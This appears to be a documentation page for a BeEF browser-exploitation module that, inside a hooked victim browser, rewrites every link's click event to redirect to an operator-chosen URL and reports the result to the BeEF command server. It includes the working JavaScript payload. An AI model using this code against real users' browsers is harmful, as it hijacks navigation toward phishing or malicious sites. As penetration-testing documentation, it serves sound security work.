## Summary

* **Objective**: Replace all links to a specified link
* **Authors**: xntrik, @bilawalhameed, passbe
* **Browsers**: All except Chrome

* [Code](https://github.com/beefproject/beef/tree/master/modules/hooked_domain/link_rewrite_click_events)

## Internal Working

sets a javascript callback function on the element of all links to redirect to a specified link when clicked.

```js

beef.execute(function() {
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+beef.dom.rewriteLinksClickEvents('<%= @url %>')+' links rewritten to <%= @url %>');
});

//rewriteLinksClickEvents function

rewriteLinksClickEvents: function(url, selector) {
        var sel = (selector == null) ? 'a' : selector;
        return $j(sel).each(function() {
                if ($j(this).attr('href') != null)
                {
                        $j(this).click(function() {this.href=url});
                }
        }).length;
},

```

## Feedback
